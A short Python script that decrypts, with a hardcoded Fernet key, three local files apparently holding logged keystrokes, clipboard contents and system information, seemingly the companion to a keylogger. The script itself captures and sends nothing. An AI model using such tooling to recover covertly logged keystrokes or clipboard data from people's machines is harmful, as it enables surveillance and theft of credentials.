from cryptography.fernet import Fernet
key = "BeaODkSUzxAscMjAvU2yQyuCuccJL2lrBMShRzkn8XU="
system_information = "e_systeminfo.txt"
clipboard_information = "e_clipboard.txt"
key_informations = "e_keys_logged.tx"

encrypted_files = [system_information, clipboard_information, key_informations]
count = 0
for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)

    count += 1
